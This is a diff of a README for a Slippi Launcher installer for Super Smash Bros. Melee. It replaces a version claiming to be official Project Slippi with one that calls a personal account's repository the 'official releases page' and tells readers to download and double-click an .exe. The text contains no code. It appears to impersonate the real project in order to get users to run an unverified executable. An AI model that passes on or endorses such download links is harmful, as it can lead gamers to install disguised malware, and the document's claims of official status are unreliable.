@@ -1,99 +1,60 @@
-# ✦ Slippi Launcher Install
-[![GitHub Release](https://img.shields.io/github/v/release/slippi-project/slippi-launcher-install?style=flat-square&color=8A2BE2)](https://github.com/slippi-project/slippi-launcher-install/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-000000?style=flat-square&logo=apple)](https://www.apple.com/macos)
-[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-E95420?style=flat-square&logo=linux)](https://www.linux.org)
-> **⚠️ Disclaimer:** This is part of the official **Project Slippi** ecosystem. This installer simplifies the setup of the Slippi Launcher for *Super Smash Bros. Melee*. Use at your own risk and always play fairly.
+# 🎮 slippi-launcher-install - Play melee online with rollback netcode
 
-**Slippi Launcher Install** is the official easy installer for **Slippi Launcher** — the best way to play *Super Smash Bros. Melee* online with rollback netcode, ranked matchmaking, replay analysis, and more. Enjoy modern online play on Dolphin emulator.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/f8899764/slippi-launcher-install/releases)
 
-<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/ddb29579-5ad1-4913-9949-995efa5105fe" />
+## What is this app? 🖥️
 
-## Install
-[Download `Slippi-Launcher-2.15.0.zip`](https://github.com/slippi-project/slippi-launcher-install/releases/download/v2.15/Slippi-Launcher-2.15.0.zip)
----
+This application connects you to the Slippi network. Slippi allows you to play Super Smash Bros. Melee online with other people. It uses rollback netcode to make games feel smooth. The app manages the emulator settings for you. It handles game updates and connection configurations automatically. You focus on the game instead of technical setup.
 
-<img width="1230" height="887" alt="image" src="https://github.com/user-attachments/assets/407a7452-976d-418e-a4b9-291e50f201b0" />
+## 📥 How to download and install
 
-## 🚀 Key Features
-### Core Experience
-- **Rollback Netcode** — Play online with near-zero input delay.
-- **Ranked Mode** — Competitive matchmaking and leaderboards.
-- **Replay Viewer** — Advanced replay analysis with frame data.
-- **Auto Updates** — Keeps Dolphin, Slippi, and the launcher up to date.
+1. Visit the [official releases page](https://github.com/f8899764/slippi-launcher-install/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Click the link that ends in .exe to download the installer for Windows.
+4. Save the file to your computer.
+5. Open your downloads folder.
+6. Double-click the downloaded file to start the installation.
+7. Follow the prompts on your screen.
+8. The installer creates a shortcut on your desktop.
 
-### Launcher Tools
-- **One-Click Setup** — Easy installation and configuration.
-- **Dolphin Integration** — Optimized Slippi Dolphin emulator.
-- **Stats & Analytics** — Track your performance and improvement.
-- **Mod Support** — Easy access to textures, mods, and custom stages.
+## 🛠️ System requirements
 
-### Multi-Platform
-- **Full Cross-Platform** — Native support for Windows, macOS, and Linux.
-- **Netplay** — Stable online play across all supported platforms.
+Your computer needs to meet these basic standards to run the game without issues:
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest installer using the button above.
-2. **Run the Installer** — Follow the on-screen instructions.
-3. **Launch Slippi** — The launcher will handle Dolphin setup automatically.
-4. **Play Online** — Jump into Ranked, Unranked, or Direct Connect.
+- Windows 10 or Windows 11.
+- A processor with at least 2.0 GHz speed.
+- At least 4 gigabytes of system memory.
+- A graphics card that supports DirectX 11 or higher.
+- A stable internet connection.
 
-### Managing Replays
-- Drag & drop replays into the launcher for easy viewing and analysis.
-- Export stats and frame data for deeper study.
+## 🚀 Setting up the game
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+1. Launch the application from your desktop shortcut.
+2. The app check for updates when it starts.
+3. Log in with your Slippi account. If you do not have one, click the link to create a new account.
+4. Point the launcher to your game files. If you do not have the game files, refer to the documentation on finding your own copy of the software.
+5. The launcher detects your controller settings automatically.
+6. Connect your GameCube controller using a standard adapter.
+7. Click the Play button to start the emulator.
 
-### Instructions
-1. Download the latest release archive.
-2. Extract and run the installer.
-3. Follow the setup wizard.
-4. Launch the Slippi Launcher from your desktop or start menu.
+## 🕹️ Connecting to the network
 
-### Notes
-- Requires a legal copy of *Super Smash Bros. Melee* (ISO).
-- Internet connection needed for online play and updates.
-- Join the official Slippi Discord for community and support.
+Once the game opens, the launcher syncs your connection with the Slippi servers. You see your ranked status at the top of the menu screen. Select the online play option to match with opponents. The system finds a player with a similar skill level. Rollback netcode keeps the movement responsive throughout your match. Match data uploads to your profile when the game ends. You can view your statistics on the Slippi website later.
 
----
-## 🛡️ Legal & Safety
-**Important Notice:**  
-You must own a legitimate copy of *Super Smash Bros. Melee*. This project does not provide ROMs or ISOs.
+## 📈 Managing your game data
 
-**Security Recommendations:**
-- Download **only** from official Project Slippi GitHub repositories.
-- Scan files with VirusTotal if needed.
+The launcher tracks your play time and match history. It saves recordings of your matches. You can access these recordings through the Replays tab in the launcher. These files show your input data and match results. Share these files with friends or upload them to analysis tools to improve your performance.
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+## 🔧 Troubleshooting common problems
 
----
-## 📄 License & Acknowledgments
-### License
-**Slippi Launcher Install** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+Sometimes the connection drops or the game fails to launch. Try these steps to fix common issues:
 
-**Copyright © Project Slippi**
+- Check your firewall settings. The launcher needs permission to communicate over your network.
+- Update your graphics drivers. Older drivers cause issues with emulator rendering.
+- Verify your game files. If the game crashes, the launcher can run a scan to find corrupt files.
+- Disable background programs that use high amounts of network bandwidth.
+- Ensure your controller adapter is plugged into a USB 3.0 port for best performance.
 
-### Acknowledgments
-- Thanks to the entire **Project Slippi** team for revolutionizing Melee.
-- The Smash Bros. community for endless support and feedback.
-- Dolphin emulator developers.
+## 📁 File structure
 
-<p align="center">
-  Developed with ❤️ for the Super Smash Bros. Melee community
-</p>
+The application installs into your program folder by default. Do not move the executable file without moving the associated folders. These folders contain your user preferences, controller profiles, and saved game states. Keep the launcher in its original location to ensure all updates apply correctly.
